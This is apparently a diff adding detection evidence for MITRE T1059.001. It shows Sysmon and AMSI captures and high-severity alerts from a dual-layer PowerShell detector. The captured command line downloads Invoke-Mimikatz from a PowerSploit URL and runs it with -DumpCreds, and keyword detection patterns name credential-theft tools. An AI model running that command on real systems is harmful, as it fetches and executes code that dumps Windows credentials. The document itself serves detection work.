@@ -1,0 +1,17 @@
+--- T1059.001 (Mimikatz) EVIDENCE ---
+
+1. Sysmon EID 1 (Command Line Capture):
+('powershell.exe  \\"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\\"',)
+
+2. AMSI ETW (Deobfuscated Content Capture):
+('PowerShell_C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_10.0.26100.5074',)
+
+3. Raw Detections (Layer A + Layer B):
+('cmdline', 'PowerShell Suspicious Cmdline — Layer B (Dual-Layer T1059.001)', 0.0)
+('amsi', 'Invoke-Mimikatz, Net.WebClient, DownloadString, IEX (', 0.3559)
+('amsi', 'Invoke-WebRequest', 0.3488)
+('amsi', 'Invoke-Mimikatz, Invoke-ReflectivePEInjection', 0.2903)
+
+4. Final Alert (Dual-Layer Merge):
+(140, 'T1059.001', 'HIGH', 0, 'Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)', 'Invoke-Mimikatz, Net.WebClient, DownloadString, IEX (', 'fc4c96d3-92eb-6a53-0803-000000001500')
+(141, 'T1059.001', 'HIGH', 0, 'Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)', 'Invoke-Mimikatz, Invoke-ReflectivePEInjection', 'fc4c96d3-92eb-6a53-0803-000000001500')
